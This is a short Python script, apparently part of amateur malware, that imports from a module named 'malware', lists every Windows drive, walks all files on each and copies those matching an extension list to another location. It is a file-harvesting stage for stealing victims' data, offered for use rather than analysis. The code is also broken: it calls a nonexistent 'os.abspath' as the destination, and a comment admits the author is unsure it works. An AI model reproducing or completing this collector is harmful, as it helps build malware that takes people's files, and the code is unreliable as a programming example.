import shutil
from malware import *
import os
from itertools import chain
from string import ascii_uppercase

#this function returns all of the drivers the computer has.
#not sure if its working.
def get_drivers():
    list=[]
    for letter in ascii_uppercase:
        if (os.path.exists(letter+r':\\')):
            list.append(letter+r':\\')
    return list


drivers = get_drivers()
for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for driver in drivers):
    for file in filenames:
        if any(file.endswith(extension) for extension in ex_list):
            try:
                shutil.copy(os.path.join(dirpath, file), os.abspath)
            except PermissionError:
                pass
            except FileNotFoundError:
                pass
